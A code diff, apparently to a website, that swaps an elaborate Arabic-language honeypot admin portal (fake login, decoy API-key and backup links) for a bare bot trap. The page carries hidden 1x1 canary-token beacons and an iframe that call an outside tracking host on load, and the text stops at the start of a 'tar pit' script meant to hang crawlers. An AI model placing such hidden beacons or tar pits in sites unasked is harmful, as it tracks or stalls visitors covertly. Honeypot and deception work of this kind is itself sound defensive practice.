@@ -1,197 +1,19 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GameGuard - Admin Portal | Honeypot System</title>
-    
-    <!-- ===== CANARY TOKEN - WEB BUG ===== -->
-    <!-- أي زائر يفتح الموقع يرسل تنبيه فوري -->
-    <img src="http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/submit.aspx" width="1" height="1" style="display:none;position:absolute;visibility:hidden;" alt="" crossorigin="anonymous">
-    
-    <script>
-        // Canary Token - JavaScript Backup Trigger
-        (function(){
-            var img = new Image();
-            img.src = "http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/submit.aspx?t=" + Date.now() + "&ref=" + encodeURIComponent(document.referrer);
-            // DNS prefetch as additional trigger
-            var link = document.createElement('link');
-            link.rel = 'dns-prefetch';
-            link.href = 'http://canarytokens.com';
-            document.head.appendChild(link);
-        })();
-    </script>
-    
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-    
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        'cairo': ['Cairo', 'sans-serif'],
-                        'orbitron': ['Orbitron', 'monospace'],
-                    },
-                    colors: {
-                        'cyber-black': '#0a0a0f',
-                        'cyber-dark': '#12121a',
-                        'cyber-gray': '#1a1a2e',
-                        'neon-green': '#00ff88',
-                        'neon-blue': '#00d4ff',
-                        'neon-red': '#ff2a6d',
-                        'neon-purple': '#bc13fe',
-                        'neon-yellow': '#f9e900',
-                    }
-                }
-            }
-        }
-    </script>
-
+    <meta name="robots" content="index, follow">
+    <title>Admin Panel - Secure Login</title>
     <style>
-        body {
-            font-family: 'Cairo', sans-serif;
-            background-color: #0a0a0f;
-            color: #e0e0e0;
-            overflow-x: hidden;
-        }
-        
-        /* Matrix Background */
-        #matrix-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            opacity: 0.12;
-            pointer-events: none;
-        }
-
-        .glass {
-            background: rgba(26, 26, 46, 0.8);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(0, 255, 136, 0.15);
-        }
-
-        .glass-strong {
-            background: rgba(18, 18, 26, 0.95);
-            backdrop-filter: blur(24px);
-            border: 1px solid rgba(0, 212, 255, 0.2);
-        }
-
-        .neon-text {
-            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5),
-                         0 0 20px rgba(0, 255, 136, 0.3);
-        }
-
-        .neon-text-red {
-            text-shadow: 0 0 10px rgba(255, 42, 109, 0.5),
-                         0 0 20px rgba(255, 42, 109, 0.3);
-        }
-
-        .grid-bg {
-            background-image: 
-                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
-            background-size: 50px 50px;
-        }
-
-        .cyber-card {
-            transition: all 0.3s ease;
-            position: relative;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #ffffff; 
+            color: #ffffff; 
+            font-family: Arial, sans-serif;
             overflow: hidden;
         }
-        .cyber-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #00ff88, transparent);
-            transition: left 0.5s;
-        }
-        .cyber-card:hover::before {
-            left: 100%;
-        }
-        .cyber-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 40px rgba(0, 255, 136, 0.1);
-            border-color: rgba(0, 255, 136, 0.3);
-        }
-
-        .trap-link {
-            position: relative;
-            cursor: pointer;
-        }
-        .trap-link::after {
-            content: '⚠ TRAP';
-            position: absolute;
-            top: -10px;
-            right: -10px;
-            font-size: 8px;
-            background: #ff2a6d;
-            color: white;
-            padding: 2px 6px;
-            border-radius: 4px;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        .trap-link:hover::after {
-            opacity: 1;
-        }
-
-        .page {
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-        .page.active {
-            display: block;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #0a0a0f; }
-        ::-webkit-scrollbar-thumb { background: #00ff88; border-radius: 4px; }
-
-        .status-dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-left: 6px;
-            animation: pulse-dot 2s infinite;
-        }
-        .status-active {
-            background-color: #00ff88;
-            box-shadow: 0 0 10px #00ff88;
-        }
-        @keyframes pulse-dot {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-
-        /* Honeypot Form Styles */
-        .honeypot-input {
-            background: rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,42,109,0.3);
-            color: #ff2a6d;
-        }
-        .honeypot-input:focus {
-            border-color: #ff2a6d;
-            box-shadow: 0 0 15px rgba(255,42,109,0.2);
-            outline: none;
-        }
-
-        /* Hidden Trap Indicator */
-        .trap-hidden {
+        /* صورة Canary Token مخفية — تتفعّل لما يدخل أي بوت */
+        .trap {
             position: absolute;
             width: 1px;
             height: 1px;
@@ -200,876 +22,117 @@
         }
     </style>
 </head>
-<body class="font-cairo grid-bg min-h-screen relative">
+<body>
 
-    <!-- Matrix Background -->
-    <canvas id="matrix-canvas"></canvas>
-
-    <!-- Navigation -->
-    <nav class="fixed top-0 w-full z-50 glass-strong border-b border-neon-green/20">
-        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-                <div class="w-10 h-10 rounded-lg bg-gradient-to-br from-neon-red to-neon-purple flex items-center justify-center animate-pulse">
-                    <i class="fas fa-shield-alt text-white text-xl"></i>
-                </div>
-                <div>
-                    <h1 class="font-orbitron font-bold text-xl text-white tracking-wider">Game<span class="text-neon-red">Guard</span></h1>
-                    <p class="text-xs text-gray-400 font-orbitron">ADMIN PORTAL v3.0</p>
-                </div>
-            </div>
-            
-            <div class="hidden md:flex items-center gap-6">
-                <button onclick="showPage('home')" class="nav-btn text-gray-300 hover:text-neon-red transition-colors font-bold" id="nav-home">
-                    <i class="fas fa-lock ml-2"></i>بوابة الدخول
-                </button>
-                <button onclick="showPage('dashboard')" class="nav-btn text-gray-300 hover:text-neon-green transition-colors font-bold" id="nav-dashboard">
-                    <i class="fas fa-chart-line ml-2"></i>لوحة التحكم
-                </button>
-                <button onclick="showPage('traps')" class="nav-btn text-gray-300 hover:text-neon-yellow transition-colors font-bold" id="nav-traps">
-                    <i class="fas fa-bug ml-2"></i>المصائد
-                </button>
-                <button onclick="showPage('logs')" class="nav-btn text-gray-300 hover:text-neon-blue transition-colors font-bold" id="nav-logs">
-                    <i class="fas fa-terminal ml-2"></i>السجلات
-                </button>
-            </div>
-
-            <div class="flex items-center gap-4">
-                <div class="hidden md:flex items-center gap-2 px-3 py-1 rounded-full bg-neon-red/10 border border-neon-red/30">
-                    <span class="status-dot status-active"></span>
-                    <span class="text-neon-red text-sm font-bold font-orbitron">ARMED</span>
-                </div>
-                <button class="md:hidden text-white text-2xl" onclick="toggleMobileMenu()">
-                    <i class="fas fa-bars"></i>
-                </button>
-            </div>
-        </div>
-        
-        <div id="mobile-menu" class="hidden md:hidden glass-strong border-t border-neon-red/20">
-            <div class="container mx-auto px-4 py-4 flex flex-col gap-3">
-                <button onclick="showPage('home')" class="text-right text-gray-300 hover:text-neon-red py-2">بوابة الدخول</button>
-                <button onclick="showPage('dashboard')" class="text-right text-gray-300 hover:text-neon-green py-2">لوحة التحكم</button>
-                <button onclick="showPage('traps')" class="text-right text-gray-300 hover:text-neon-yellow py-2">المصائد</button>
-                <button onclick="showPage('logs')" class="text-right text-gray-300 hover:text-neon-blue py-2">السجلات</button>
-            </div>
-        </div>
-    </nav>
-
-    <!-- ==================== HOME PAGE - HONEYPOT LOGIN ==================== -->
-    <div id="page-home" class="page active pt-24 pb-12">
-        <div class="container mx-auto px-4 min-h-[80vh] flex items-center justify-center">
-            <div class="w-full max-w-md">
-                
-                <!-- Honeypot Login Form -->
-                <div class="glass rounded-2xl p-8 border border-neon-red/30 relative overflow-hidden">
-                    <!-- Decorative Elements -->
-                    <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-neon-red via-neon-purple to-neon-red"></div>
-                    <div class="absolute -top-20 -right-20 w-40 h-40 bg-neon-red/10 rounded-full blur-3xl"></div>
-                    
-                    <div class="text-center mb-8">
-                        <div class="w-20 h-20 mx-auto rounded-full bg-gradient-to-br from-neon-red to-neon-purple flex items-center justify-center mb-4 shadow-lg shadow-neon-red/20">
-                            <i class="fas fa-user-shield text-3xl text-white"></i>
-                        </div>
-                        <h2 class="text-2xl font-bold text-white font-orbitron">Admin Portal</h2>
-                        <p class="text-gray-400 text-sm mt-2">تسجيل الدخول إلى لوحة تحكم GameGuard</p>
-                    </div>
-
-                    <form id="honeypot-form" onsubmit="handleHoneypotSubmit(event)" class="space-y-5">
-                        <div>
-                            <label class="block text-gray-400 text-sm mb-2">اسم المستخدم / Admin ID</label>
-                            <div class="relative">
-                                <i class="fas fa-user absolute right-3 top-3.5 text-neon-red/50"></i>
-                                <input type="text" id="trap-username" class="honeypot-input w-full pr-10 pl-4 py-3 rounded-lg text-right" placeholder="admin@gameguard.local" autocomplete="off">
-                            </div>
-                        </div>
-
-                        <div>
-                            <label class="block text-gray-400 text-sm mb-2">كلمة المرور / Access Key</label>
-                            <div class="relative">
-                                <i class="fas fa-key absolute right-3 top-3.5 text-neon-red/50"></i>
-                                <input type="password" id="trap-password" class="honeypot-input w-full pr-10 pl-4 py-3 rounded-lg text-right" placeholder="••••••••••••" autocomplete="off">
-                            </div>
-                        </div>
-
-                        <div class="flex items-center justify-between text-sm">
-                            <label class="flex items-center gap-2 text-gray-400 cursor-pointer">
-                                <input type="checkbox" class="rounded bg-cyber-black border-neon-red/30 text-neon-red focus:ring-neon-red">
-                                <span>تذكرني</span>
-                            </label>
-                            <a href="#" onclick="triggerTrap('password-reset')" class="text-neon-red hover:text-neon-red/80">نسيت كلمة المرور؟</a>
-                        </div>
-
-                        <button type="submit" class="w-full py-4 bg-gradient-to-r from-neon-red to-neon-purple text-white font-bold rounded-lg hover:shadow-lg hover:shadow-neon-red/30 transition-all hover:scale-[1.02]">
-                            <i class="fas fa-sign-in-alt ml-2"></i>
-                            تسجيل الدخول
-                        </button>
-
-                        <div class="text-center">
-                            <p class="text-gray-500 text-xs">GameGuard Security System © 2026</p>
-                        </div>
-                    </form>
-
-                    <!-- Hidden Trap Links (Visible to bots/scanners) -->
-                    <div class="mt-6 pt-6 border-t border-gray-800">
-                        <p class="text-xs text-gray-600 mb-3 text-center">روابط سريعة للمشرفين</p>
-                        <div class="flex flex-wrap justify-center gap-2">
-                            <a href="#/api-keys" onclick="triggerTrap('api-keys')" class="text-xs text-gray-700 hover:text-neon-red transition-colors px-2 py-1 rounded border border-gray-800">API Keys</a>
-                            <a href="#/db-config" onclick="triggerTrap('db-config')" class="text-xs text-gray-700 hover:text-neon-red transition-colors px-2 py-1 rounded border border-gray-800">DB Config</a>
-                            <a href="#/user-logs" onclick="triggerTrap('user-logs')" class="text-xs text-gray-700 hover:text-neon-red transition-colors px-2 py-1 rounded border border-gray-800">User Logs</a>
-                            <a href="#/backup" onclick="triggerTrap('backup')" class="text-xs text-gray-700 hover:text-neon-red transition-colors px-2 py-1 rounded border border-gray-800">Backup</a>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Warning Banner -->
-                <div class="mt-6 glass rounded-lg p-4 border border-neon-yellow/20 flex items-start gap-3">
-                    <i class="fas fa-exclamation-triangle text-neon-yellow text-xl mt-1"></i>
-                    <div>
-                        <h4 class="text-neon-yellow font-bold text-sm">تنبيه أمني</h4>
-                        <p class="text-gray-400 text-xs mt-1">
-                            هذه البوابة مخصصة للمشرفين المصرح لهم فقط. يتم تسجيل جميع محاولات الدخول غير المصرح بها وإرسال تنبيهات فورية لمركز العمليات.
-                        </p>
-                    </div>
-                </div>
-
-                <!-- Hidden Canary Token Image (Extra trigger) -->
-                <img src="http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/submit.aspx?source=home" class="trap-hidden" alt="">
-            </div>
-        </div>
-    </div>
-
-    <!-- ==================== DASHBOARD PAGE ==================== -->
-    <div id="page-dashboard" class="page pt-24 pb-12">
-        <div class="container mx-auto px-4">
-            <div class="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 gap-4">
-                <div>
-                    <h1 class="text-3xl font-bold font-orbitron text-white">
-                        <i class="fas fa-chart-line text-neon-green ml-2"></i>
-                        لوحة <span class="text-neon-green">المراقبة</span>
-                    </h1>
-                    <p class="text-gray-400 mt-2">بيانات حقيقية من Canary Token والمصائد المفعلة</p>
-                </div>
-                <div class="flex gap-3">
-                    <button onclick="refreshDashboard()" class="px-4 py-2 glass rounded-lg text-neon-green hover:bg-neon-green/10 transition-colors border border-neon-green/20">
-                        <i class="fas fa-sync-alt ml-2"></i>تحديث
-                    </button>
-                    <div class="px-4 py-2 glass rounded-lg text-neon-blue border border-neon-blue/20 font-orbitron text-sm">
-                        <i class="fas fa-clock ml-2"></i>
-                        <span id="live-clock">00:00:00</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Stats Cards -->
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
-                <div class="glass rounded-xl p-6 border-l-4 border-neon-red cyber-card">
-                    <div class="flex justify-between items-start mb-4">
-                        <div>
-                            <p class="text-gray-400 text-sm">محاولات تسجيل دخول</p>
-                            <h3 class="text-3xl font-bold text-neon-red font-orbitron mt-1" id="stat-logins">0</h3>
-                        </div>
-                        <div class="w-12 h-12 rounded-lg bg-neon-red/10 flex items-center justify-center">
-                            <i class="fas fa-user-lock text-neon-red text-xl"></i>
-                        </div>
-                    </div>
-                    <p class="text-xs text-gray-500">من نموذج Honeypot</p>
-                </div>
-
-                <div class="glass rounded-xl p-6 border-l-4 border-neon-yellow cyber-card">
-                    <div class="flex justify-between items-start mb-4">
-                        <div>
-                            <p class="text-gray-400 text-sm">روابط خداعة تم الوصول لها</p>
-                            <h3 class="text-3xl font-bold text-neon-yellow font-orbitron mt-1" id="stat-traps">0</h3>
-                        </div>
-                        <div class="w-12 h-12 rounded-lg bg-neon-yellow/10 flex items-center justify-center">
-                            <i class="fas fa-bug text-neon-yellow text-xl"></i>
-                        </div>
-                    </div>
-                    <p class="text-xs text-gray-500">Traps Triggered</p>
-                </div>
-
-                <div class="glass rounded-xl p-6 border-l-4 border-neon-purple cyber-card">
-                    <div class="flex justify-between items-start mb-4">
-                        <div>
-                            <p class="text-gray-400 text-sm">IPs مكتشفة</p>
-                            <h3 class="text-3xl font-bold text-neon-purple font-orbitron mt-1" id="stat-ips">0</h3>
-                        </div>
-                        <div class="w-12 h-12 rounded-lg bg-neon-purple/10 flex items-center justify-center">
-                            <i class="fas fa-fingerprint text-neon-purple text-xl"></i>
-                        </div>
-                    </div>
-                    <p class="text-xs text-gray-500">فريدة (Unique)</p>
-                </div>
-
-                <div class="glass rounded-xl p-6 border-l-4 border-neon-blue cyber-card">
-                    <div class="flex justify-between items-start mb-4">
-                        <div>
-                            <p class="text-gray-400 text-sm">Canary Alerts</p>
-                            <h3 class="text-3xl font-bold text-neon-blue font-orbitron mt-1" id="stat-canary">0</h3>
-                        </div>
-                        <div class="w-12 h-12 rounded-lg bg-neon-blue/10 flex items-center justify-center">
-                            <i class="fas fa-bell text-neon-blue text-xl"></i>
-                        </div>
-                    </div>
-                    <p class="text-xs text-gray-500">تنبيهات واردة</p>
-                </div>
-            </div>
-
-            <!-- Charts -->
-            <div class="grid lg:grid-cols-2 gap-6 mb-8">
-                <div class="glass rounded-xl p-6 border border-neon-green/10">
-                    <h3 class="text-lg font-bold text-white mb-6">
-                        <i class="fas fa-chart-bar text-neon-green ml-2"></i>
-                        توزيع أنواع الهجمات
-                    </h3>
-                    <canvas id="attackTypesChart" height="200"></canvas>
-                </div>
-
-                <div class="glass rounded-xl p-6 border border-neon-blue/10">
-                    <h3 class="text-lg font-bold text-white mb-6">
-                        <i class="fas fa-clock text-neon-blue ml-2"></i>
-                        الجدول الزمني للزيارات
-                    </h3>
-                    <canvas id="timelineChart" height="200"></canvas>
-                </div>
-            </div>
-
-            <!-- Recent Detections -->
-            <div class="glass rounded-xl p-6 border border-neon-red/10">
-                <div class="flex justify-between items-center mb-6">
-                    <h3 class="text-lg font-bold text-white">
-                        <i class="fas fa-list-ul text-neon-red ml-2"></i>
-                        آخر الكشوفات
-                    </h3>
-                    <span class="px-3 py-1 rounded-full bg-neon-red/10 text-neon-red text-xs border border-neon-red/20">
-                        <span class="status-dot status-danger"></span>
-                        مباشر
-                    </span>
-                </div>
-                
-                <div class="overflow-x-auto">
-                    <table class="w-full text-right">
-                        <thead>
-                            <tr class="text-gray-400 text-sm border-b border-gray-700">
-                                <th class="pb-3 font-normal">الوقت</th>
-                                <th class="pb-3 font-normal">النوع</th>
-                                <th class="pb-3 font-normal">البيانات</th>
-                                <th class="pb-3 font-normal">المصدر</th>
-                                <th class="pb-3 font-normal">الحالة</th>
-                            </tr>
-                        </thead>
-                        <tbody id="detections-table" class="text-sm">
-                            <!-- Filled by JS -->
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ==================== TRAPS PAGE ==================== -->
-    <div id="page-traps" class="page pt-24 pb-12">
-        <div class="container mx-auto px-4">
-            <h1 class="text-3xl font-bold font-orbitron text-white mb-2">
-                <i class="fas fa-bug text-neon-yellow ml-2"></i>
-                <span class="text-neon-yellow">المصائد</span> النشطة
-            </h1>
-            <p class="text-gray-400 mb-8">روابط ونماذج خداعية تكشف أي محاولة اختراق</p>
-
-            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
-                <!-- Trap 1: Login Form -->
-                <div class="glass rounded-xl p-6 border border-neon-red/20 cyber-card">
-                    <div class="flex items-center justify-between mb-4">
-                        <div class="w-12 h-12 rounded-lg bg-neon-red/10 flex items-center justify-center">
-                            <i class="fas fa-user-lock text-neon-red text-xl"></i>
-                        </div>
-                        <span class="px-2 py-1 rounded-full bg-neon-green/10 text-neon-green text-xs border border-neon-green/20 text-xs">مفعل</span>
-                    </div>
-                    <h3 class="text-lg font-bold text-white mb-2">نموذج تسجيل دخول وهمي</h3>
-                    <p class="text-gray-400 text-sm mb-4">يخدع الهاكرز لإدخال بياناتهم. يتم تسجيل كل محاولة.</p>
-                    <div class="bg-cyber-black rounded-lg p-3 font-mono text-xs text-neon-red border border-neon-red/10">
-                        /home (البوابة الرئيسية)
-                    </div>
-                    <div class="mt-4 flex justify-between items-center">
-                        <span class="text-xs text-gray-500" id="trap-count-login">0 محاولات</span>
-                        <button onclick="showPage('home')" class="text-xs text-neon-red hover:text-white transition-colors">
-                            عرض <i class="fas fa-arrow-left mr-1"></i>
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Trap 2: API Keys -->
-                <div class="glass rounded-xl p-6 border border-neon-yellow/20 cyber-card">
-                    <div class="flex items-center justify-between mb-4">
-                        <div class="w-12 h-12 rounded-lg bg-neon-yellow/10 flex items-center justify-center">
-                            <i class="fas fa-key text-neon-yellow text-xl"></i>
-                        </div>
-                        <span class="px-2 py-1 rounded-full bg-neon-green/10 text-neon-green text-xs border border-neon-green/20 text-xs">مفعل</span>
-                    </div>
-                    <h3 class="text-lg font-bold text-white mb-2">API Keys وهمية</h3>
-                    <p class="text-gray-400 text-sm mb-4">رابط خداعي يبدو وكأنه يحتوي على مفاتيح API سرية.</p>
-                    <div class="bg-cyber-black rounded-lg p-3 font-mono text-xs text-neon-yellow border border-neon-yellow/10">
-                        /api-keys
-                    </div>
-                    <div class="mt-4 flex justify-between items-center">
-                        <span class="text-xs text-gray-500" id="trap-count-api">0 وصول</span>
-                        <button onclick="triggerTrap('api-keys')" class="text-xs text-neon-yellow hover:text-white transition-colors">
-                            اختبار <i class="fas fa-arrow-left mr-1"></i>
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Trap 3: DB Config -->
-                <div class="glass rounded-xl p-6 border border-neon-purple/20 cyber-card">
-                    <div class="flex items-center justify-between mb-4">
-                        <div class="w-12 h-12 rounded-lg bg-neon-purple/10 flex items-center justify-center">
-                            <i class="fas fa-database text-neon-purple text-xl"></i>
-                        </div>
-                        <span class="px-2 py-1 rounded-full bg-neon-green/10 text-neon-green text-xs border border-neon-green/20 text-xs">مفعل</span>
-                    </div>
-                    <h3 class="text-lg font-bold text-white mb-2">إعدادات قاعدة البيانات</h3>
-                    <p class="text-gray-400 text-sm mb-4">صفحة وهمية تحتوي على بيانات وصول قاعدة البيانات.</p>
-                    <div class="bg-cyber-black rounded-lg p-3 font-mono text-xs text-neon-purple border border-neon-purple/10">
-                        /db-config
-                    </div>
-                    <div class="mt-4 flex justify-between items-center">
-                        <span class="text-xs text-gray-500" id="trap-count-db">0 وصول</span>
-                        <button onclick="triggerTrap('db-config')" class="text-xs text-neon-purple hover:text-white transition-colors">
-                            اختبار <i class="fas fa-arrow-left mr-1"></i>
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Trap 4: User Logs -->
-                <div class="glass rounded-xl p-6 border border-neon-blue/20 cyber-card">
-                    <div class="flex items-center justify-between mb-4">
-                        <div class="w-12 h-12 rounded-lg bg-neon-blue/10 flex items-center justify-center">
-                            <i class="fas fa-file-alt text-neon-blue text-xl"></i>
-                        </div>
-                        <span class="px-2 py-1 rounded-full bg-neon-green/10 text-neon-green text-xs border border-neon-green/20 text-xs">مفعل</span>
-                    </div>
-                    <h3 class="text-lg font-bold text-white mb-2">سجلات المستخدمين</h3>
-                    <p class="text-gray-400 text-sm mb-4">صفحة وهمية تحتوي على سجلات حساسة للمستخدمين.</p>
-                    <div class="bg-cyber-black rounded-lg p-3 font-mono text-xs text-neon-blue border border-neon-blue/10">
-                        /user-logs
-                    </div>
-                    <div class="mt-4 flex justify-between items-center">
-                        <span class="text-xs text-gray-500" id="trap-count-logs">0 وصول</span>
-                        <button onclick="triggerTrap('user-logs')" class="text-xs text-neon-blue hover:text-white transition-colors">
-                            اختبار <i class="fas fa-arrow-left mr-1"></i>
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Trap 5: Backup Files -->
-                <div class="glass rounded-xl p-6 border border-neon-green/20 cyber-card">
-                    <div class="flex items-center justify-between mb-4">
-                        <div class="w-12 h-12 rounded-lg bg-neon-green/10 flex items-center justify-center">
-                            <i class="fas fa-archive text-neon-green text-xl"></i>
-                        </div>
-                        <span class="px-2 py-1 rounded-full bg-neon-green/10 text-neon-green text-xs border border-neon-green/20 text-xs">مفعل</span>
-                    </div>
-                    <h3 class="text-lg font-bold text-white mb-2">ملفات النسخ الاحتياطي</h3>
-                    <p class="text-gray-400 text-sm mb-4">روابط خداعية لملفات backup وهمية (.zip, .sql, .env).</p>
-                    <div class="bg-cyber-black rounded-lg p-3 font-mono text-xs text-neon-green border border-neon-green/10">
-                        /backup.zip, /dump.sql
-                    </div>
-                    <div class="mt-4 flex justify-between items-center">
-                        <span class="text-xs text-gray-500" id="trap-count-backup">0 وصول</span>
-                        <button onclick="triggerTrap('backup')" class="text-xs text-neon-green hover:text-white transition-colors">
-                            اختبار <i class="fas fa-arrow-left mr-1"></i>
-                        </button>
-                    </div>
-                </div>
-
-                <!-- Trap 6: Canary Token -->
-                <div class="glass rounded-xl p-6 border border-neon-blue/20 cyber-card">
-                    <div class="flex items-center justify-between mb-4">
-                        <div class="w-12 h-12 rounded-lg bg-neon-blue/10 flex items-center justify-center">
-                            <i class="fas fa-bell text-neon-blue text-xl"></i>
-                        </div>
-                        <span class="px-2 py-1 rounded-full bg-neon-green/10 text-neon-green text-xs border border-neon-green/20 text-xs">مفعل</span>
-                    </div>
-                    <h3 class="text-lg font-bold text-white mb-2">Canary Token</h3>
-                    <p class="text-gray-400 text-sm mb-4">تنبيه فوري عبر البريد عند أي زيارة للموقع.</p>
-                    <div class="bg-cyber-black rounded-lg p-3 font-mono text-xs text-neon-blue border border-neon-blue/10 truncate">
-                        canarytokens.com/...
-                    </div>
-                    <div class="mt-4 flex justify-between items-center">
-                        <span class="text-xs text-gray-500" id="trap-count-canary">تنبيهات فورية</span>
-                        <span class="text-xs text-neon-blue">مدمج في كل الصفحات</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Hidden Traps Info -->
-            <div class="mt-8 glass rounded-xl p-6 border border-neon-red/20">
-                <h3 class="text-lg font-bold text-white mb-4">
-                    <i class="fas fa-eye-slash text-neon-red ml-2"></i>
-                    مصائد مخفية (Hidden Traps)
-                </h3>
-                <div class="grid md:grid-cols-2 gap-4 text-sm">
-                    <div class="flex items-start gap-3 p-3 rounded-lg bg-cyber-black/50">
-                        <i class="fas fa-image text-neon-purple mt-1"></i>
-                        <div>
-                            <h4 class="text-white font-bold">Web Bug Image</h4>
-                            <p class="text-gray-400">صورة 1x1 بكسل مخفية تحمل رابط Canary Token. تُحمّل مع كل زيارة.</p>
-                        </div>
-                    </div>
-                    <div class="flex items-start gap-3 p-3 rounded-lg bg-cyber-black/50">
-                        <i class="fas fa-code text-neon-yellow mt-1"></i>
-                        <div>
-                            <h4 class="text-white font-bold">HTML Comments</h4>
-                            <p class="text-gray-400">تعليقات HTML تحتوي على روابط خداعية تُكتشف بواسطة الماسحات الضوئية.</p>
-                        </div>
-                    </div>
-                    <div class="flex items-start gap-3 p-3 rounded-lg bg-cyber-black/50">
-                        <i class="fas fa-robot text-neon-green mt-1"></i>
-                        <div>
-                            <h4 class="text-white font-bold">Robots.txt Trap</h4>
-                            <p class="text-gray-400">ملف robots.txt يدل البوتات على روابط خداعية (Disallow: /secret).</p>
-                        </div>
-                    </div>
-                    <div class="flex items-start gap-3 p-3 rounded-lg bg-cyber-black/50">
-                        <i class="fas fa-link text-neon-blue mt-1"></i>
-                        <div>
-                            <h4 class="text-white font-bold">JavaScript Fetch</h4>
-                            <p class="text-gray-400">طلبات fetch مخفية تُرسل عند تحميل الصفحة لتفعيل التنبيهات.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- ==================== LOGS PAGE ==================== -->
-    <div id="page-logs" class="page pt-24 pb-12">
-        <div class="container mx-auto px-4">
-            <h1 class="text-3xl font-bold font-orbitron text-white mb-8">
-                <i class="fas fa-terminal text-neon-blue ml-2"></i>
-                سجل <span class="text-neon-blue">العمليات</span>
-            </h1>
-
-            <div class="glass rounded-xl p-6 border border-neon-blue/20">
-                <div class="flex flex-wrap gap-3 mb-6">
-                    <button onclick="filterLogs('all')" class="filter-btn px-4 py-2 rounded-lg bg-neon-blue/20 text-neon-blue border border-neon-blue/30 text-sm font-bold">الكل</button>
-                    <button onclick="filterLogs('login')" class="filter-btn px-4 py-2 rounded-lg bg-cyber-gray text-gray-400 border border-gray-700 text-sm hover:text-white transition-colors">تسجيل دخول</button>
-                    <button onclick="filterLogs('trap')" class="filter-btn px-4 py-2 rounded-lg bg-cyber-gray text-gray-400 border border-gray-700 text-sm hover:text-white transition-colors">مصائد</button>
-                    <button onclick="clearLogs()" class="px-4 py-2 rounded-lg bg-neon-red/10 text-neon-red border border-neon-red/20 text-sm hover:bg-neon-red/20 transition-colors mr-auto">
-                        <i class="fas fa-trash ml-1"></i>مسح السجل
-                    </button>
-                </div>
-
-                <div class="bg-cyber-black rounded-lg p-4 font-mono text-sm h-96 overflow-y-auto" id="terminal-logs">
-                    <div class="text-neon-green mb-2">[SYSTEM] GameGuard Honeypot System initialized...</div>
-                    <div class="text-neon-blue mb-2">[INFO] Canary Token loaded: w7srh9626rgq2zay7c5qf36u7</div>
-                    <div class="text-neon-green mb-2">[SUCCESS] Honeypot traps deployed successfully</div>
-                    <div class="text-gray-400 mb-2">[NETWORK] Monitoring all traffic on deployed nodes...</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Footer -->
-    <footer class="border-t border-gray-800 mt-20 py-8">
-        <div class="container mx-auto px-4 text-center">
-            <p class="text-gray-500 font-orbitron text-sm">
-                GameGuard Honeypot System v3.0 | 
-                <span class="text-neon-red">ARMED</span> & Ready
-            </p>
-        </div>
-    </footer>
-
-    <!-- ==================== JAVASCRIPT ==================== -->
+    <!-- ==================== CANARY TOKEN TRAPS ==================== -->
+    <!-- الصورة هذي تتفعّل Canary Token لما يحملها البوت -->
+    <img class="trap" src="http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/s" alt="">
+    
+    <!-- iframe مخفي يضمن التفعيل -->
+    <iframe class="trap" src="http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/s" sandbox=""></iframe>
+    
+    <!-- ==================== TAR PIT — يعلق البوت ==================== -->
     <script>
-        // ===== MATRIX RAIN =====
-        const canvas = document.getElementById('matrix-canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?';
-        const fontSize = 14;
-        const columns = canvas.width / fontSize;
-        const drops = [];
-        for (let i = 0; i < columns; i++) drops[i] = Math.random() * -100;
-        function drawMatrix() {
